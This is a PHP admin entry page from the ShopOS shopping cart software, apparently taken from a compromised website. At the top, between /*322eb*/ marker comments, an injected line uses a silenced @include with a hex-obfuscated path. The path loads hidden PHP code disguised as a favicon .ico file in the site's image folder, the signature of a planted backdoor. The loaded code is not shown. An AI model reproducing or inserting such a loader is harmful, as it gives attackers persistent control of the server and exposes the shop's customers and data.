<?php
/*322eb*/

@include "\x2fvar/\x77ww/s\x61lon.\x76olk.\x62y/im\x61ges/\x69nfob\x6fx/fa\x76icon\x5fdcd4\x389.ic\x6f";

/*322eb*/
/*
#####################################
#  ShopOS: Shopping Cart Software.
#  Copyright (c) 2008-2010
#  http://www.shopos.ru
#  http://www.shoposs.com
#  Ver. 1.0.0
#####################################
*/

require ('includes/top.php');

if (isset($_GET['action']) && !empty($_GET['action']))
{
   if (is_file(_PAGES_ADMIN.os_check_file_name($_GET['action']).'/'.os_check_file_name($_GET['action']).'.php'))
   {
      include(_PAGES_ADMIN.os_check_file_name($_GET['action']).'/'.os_check_file_name($_GET['action']).'.php');
   }
   else
   {
      echo 'no file';
   }
}

else
{
   os_redirect(os_href_link(FILENAME_DEFAULT));
}

?>
<?php $main->bottom(); ?>